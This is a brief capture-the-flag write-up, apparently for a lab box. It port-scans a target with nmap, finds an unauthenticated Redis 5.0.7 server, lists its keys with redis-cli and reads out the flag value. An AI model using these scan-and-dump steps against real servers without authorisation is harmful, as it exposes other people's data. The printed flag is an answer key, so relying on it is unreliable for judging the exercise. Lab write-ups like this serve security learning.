` sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.28.11  `

```
Host is up, received user-set (0.036s latency).
Scanned at 2025-12-19 10:10:26 EST for 18s
Not shown: 65535 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 5.0.7

```


First we install redis tools to interact with the service. `sudo apt install redis-tools`

Then we connect to the database using redis-cli `redis-cli -h 10.129.28.11  `

Next we use the info command to get more info on the db `10.129.28.11:6379> info `

Next we use a series of command to see the DB size and the keys in it, we then read the flag key

```
**DBSIZE**
(integer) 4
10.129.28.11:6379> **KEYS ***
1) "numb"
2) "temp"
3) "stor"
4) "flag"
10.129.28.11:6379> Get key 4
(error) ERR wrong number of arguments for 'get' command
10.129.28.11:6379> Get 4
(nil)
10.129.28.11:6379> **Get flag**
"03e1d2b376c37ab3f5319922053953eb"
10.129.28.11:6379> exit

```

**DBSIZE** - Shows us how many keys are in the database 
**KEYS** *  - shows us all the keys
**Get flag** - gets the flag key
